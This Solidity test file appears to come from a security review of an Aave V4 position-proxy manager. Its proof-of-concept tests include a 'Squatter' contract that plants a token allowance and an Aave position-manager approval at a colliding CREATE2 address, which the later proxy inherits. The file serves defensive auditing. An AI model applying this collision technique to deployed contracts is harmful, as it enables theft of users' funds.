// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

// Copyright (c) 2026 Avana Labs

import {IPositionProxy} from "../../src/proxy/position-proxy/IPositionProxy.sol";
import {PositionProxy} from "../../src/proxy/position-proxy/PositionProxy.sol";
import {IProxyManager} from "../../src/proxy/proxy-manager/IProxyManager.sol";
import {ProxyManager} from "../../src/proxy/proxy-manager/ProxyManager.sol";
import {AaveV4Fixture} from "../utils/fixtures/AaveV4Fixture.sol";
import {FreezeRegistryMock, ProxyTestToken, ProxyCallTarget} from "../utils/mocks/ProxyMocks.sol";

interface ISpokePM {
    function setUserPositionManager(address positionManager, bool approve) external;
    function isPositionManager(address user, address positionManager) external view returns (bool);
}

interface ISpokeConfiguratorPM {
    function updatePositionManager(address spoke, address positionManager, bool active) external;
}

/// Code an attacker would place at a colliding address (found by a ~2^80 birthday search over attacker-controlled
/// wallets vs attacker CREATE2 addresses), run once, and self-destruct in the creation transaction (EIP-6780).
contract Squatter {
    function run(address token, address spender, address spoke, address pm) external {
        ProxyTestToken(token).approve(spender, type(uint256).max);
        ISpokePM(spoke).setUserPositionManager(pm, true);
    }
}

/// A target that re-enters the Adapter (here: the "Adapter" records who called it).
contract AdapterLike {
    address public lastCaller;
    function poke() external { lastCaller = msg.sender; }
}

contract ProxyReviewTest is AaveV4Fixture {
    uint256 internal constant MARKET = 3;
    address internal adapter;
    FreezeRegistryMock internal registry;
    ProxyManager internal manager;

    function setUp() public {
        _deployAaveV4();
        adapter = makeAddr("AaveAdapter");
        registry = new FreezeRegistryMock();
        manager = new ProxyManager(adapter, address(registry));
    }

    /// Pre-existing external state at a predicted address (token allowances, Aave position-manager approvals) is not
    /// detected by `deployProxy`, which checks only `code.length`; the new proxy inherits it.
    function test_PoC_collisionPreStateSurvivesDeploy() public {
        ProxyTestToken token = new ProxyTestToken();
        address pm = makeAddr("activePositionManager");
        address predicted = manager.predictProxy(attacker, aave.cdpSpoke, MARKET);

        // Attacker-controlled code at the colliding address acts as that address, then is removed.
        vm.etch(predicted, type(Squatter).runtimeCode);
        Squatter(predicted).run(address(token), attacker, aave.cdpSpoke, pm);
        vm.etch(predicted, "");
        assertEq(predicted.code.length, 0);

        vm.prank(adapter);
        address proxy = manager.deployProxy(attacker, aave.cdpSpoke, MARKET);
        assertEq(proxy, predicted);

        // ERC-20 allowance from the proxy survives.
        assertEq(token.allowance(proxy, attacker), type(uint256).max, "allowance inherited");
        // Aave approval survives; it becomes effective the moment the DAO activates that position manager.
        vm.prank(aaveDao);
        ISpokeConfiguratorPM(aave.spokeConfigurator).updatePositionManager(aave.cdpSpoke, pm, true);
        assertTrue(ISpokePM(aave.cdpSpoke).isPositionManager(proxy, pm), "Aave PM approval inherited");
    }

    /// The proxy refuses only itself, zero and codeless targets; it will call the Adapter (or the ProxyManager) as
    /// itself, so an Adapter bug that routes a proxy call back into the Adapter makes the proxy a caller there.
    function test_PoC_executeAllowsAdapterAsTarget() public {
        AdapterLike a = new AdapterLike();
        ProxyManager m2 = new ProxyManager(address(a), address(registry));
        vm.prank(address(a));
        address proxy = m2.deployProxy(carol, aave.cdpSpoke, MARKET);
        vm.prank(address(a));
        IPositionProxy(proxy).execute(address(a), abi.encodeCall(AdapterLike.poke, ()));
        assertEq(a.lastCaller(), proxy);
    }

    /// predictProxy answers for triples deployProxy can never deploy (zero wallet, zero spoke, market 0).
    function test_PoC_predictForUndeployableTriple() public {
        address p = manager.predictProxy(address(0), address(0), 0);
        assertTrue(p != address(0));
        vm.prank(adapter);
        vm.expectRevert(IProxyManager.ZeroAddress.selector);
        manager.deployProxy(address(0), address(0), 0);
    }

    /// CREATE2 also fails when the target has a nonce (or storage, EIP-7610) but no code: the revert is
    /// FailedDeployment, which is not in the REQ-PROXY-097 error list.
    function test_PoC_nonceAtPredictedGivesUnlistedError() public {
        address predicted = manager.predictProxy(carol, aave.cdpSpoke, MARKET);
        vm.setNonce(predicted, 1);
        vm.prank(adapter);
        vm.expectRevert(bytes4(keccak256("FailedDeployment()")));
        manager.deployProxy(carol, aave.cdpSpoke, MARKET);
    }
}
